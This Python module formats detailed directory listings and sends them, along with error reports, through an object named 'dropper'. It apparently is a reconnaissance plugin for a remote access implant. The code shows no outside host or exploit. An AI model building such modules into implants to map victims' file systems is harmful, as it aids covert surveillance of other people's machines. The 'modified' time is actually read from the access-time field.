import re
import stat

from datetime import datetime as dtm

from os import getcwd, listdir, getenv
from os import stat as filestat
from sys import platform

def list_dir(dropper, args):
    """list a directory, giving verbose, human friendly and Platform
    agnostic output"""

    listing = []
    items = listdir(args)
    items.sort()
    for i in items:
        #Handle file size
        st = filestat(args + '/' + i)
        size = st[6]
        modified = st[7]
        if size/1000000000 >= 1:
            prnt_size = '{}G'.format(round((size/1000000000.0), 1))
        elif size/1000000 >= 1:
            prnt_size = '{}M'.format(round((size/1000000.0), 1))
        elif size/1000 >= 1:
            prnt_size = '{}K'.format(round((size/1000.0), 1))
        else:
            prnt_size = '{}'.format(size)

        #Handle file modified time
        time = dtm.fromtimestamp(modified)
        t = str(time.month) + '   ' + str(time.day) + '   ' + str(time.year) + '\t'

        #Handle file modes
        mode = ''
        mode += 'd' if stat.S_ISDIR(st.st_mode) else '-'
        mode += 'r' if st.st_mode & stat.S_IRUSR == stat.S_IRUSR else '-'
        mode += 'w' if st.st_mode & stat.S_IWUSR == stat.S_IWUSR else '-'
        mode += 'x' if st.st_mode & stat.S_IXUSR == stat.S_IXUSR else '-'
        if platform != 'win32':   #The rest doesn't mean much
            mode += 'r' if st.st_mode & stat.S_IRGRP == stat.S_IRGRP else '-'
            mode += 'w' if st.st_mode & stat.S_IWGRP == stat.S_IWGRP else '-'
            mode += 'x' if st.st_mode & stat.S_IXGRP == stat.S_IXGRP else '-'
            mode += 'r' if st.st_mode & stat.S_IROTH == stat.S_IROTH else '-'
            mode += 'w' if st.st_mode & stat.S_IWOTH == stat.S_IWOTH else '-'
            mode += 'x' if st.st_mode & stat.S_IXOTH == stat.S_IXOTH else '-'
        else:   #Somw Windows specific stuff
            mode += '  '
            mode += 'a' if st.st_file_attributes & stat.FILE_ATTRIBUTE_ARCHIVE ==\
                    stat.FILE_ATTRIBUTE_ARCHIVE else '-'
            mode += 'r' if st.st_file_attributes & stat.FILE_ATTRIBUTE_READONLY ==\
                     stat.FILE_ATTRIBUTE_READONLY else '-'
            mode += 'h' if st.st_file_attributes & stat.FILE_ATTRIBUTE_HIDDEN ==\
                    stat.FILE_ATTRIBUTE_HIDDEN else '-'
            mode += 's' if st.st_file_attributes & stat.FILE_ATTRIBUTE_SYSTEM ==\
                    stat.FILE_ATTRIBUTE_SYSTEM else '-'




        listing .append("{:<10} {:>6}   {:<2} {:<2} {:<5} {:<10} {} {}".format(
                mode, prnt_size , time.strftime('%b'), time.day, time.year, \
                str(time.hour) + ':' + str(time.minute), str(i),'\n'))

    dropper.send("Directory listing of {} :\n{}".format(args, ''.join(listing)))

def main(dropper, args=None):
    """decide what directory to list and call list for it"""

    if args:
        try:
            if '~' in args:
                print("DEBUG - scrubbing tildae from listing:")
                args = re.sub('~', getenv('HOME'), args)
            list_dir(dropper, args)
        except Exception as e:
            dropper.send("ERROR - {} couldn't list directory of {} because : {}".format(dropper.name, args, e))
    else:
        try:
            '''
            listing = ''
            for i in listdir(getcwd()):
                listing += i +'\n'
            dropper.send("Directory listing of {} :\n{}".format(getcwd(), listing))
            '''
            list_dir(dropper, getcwd())
        except Exception as e:
            dropper.send("ERROR - {} couldn't list directory of {} because : {}".format(dropper.name, getcwd(), e))
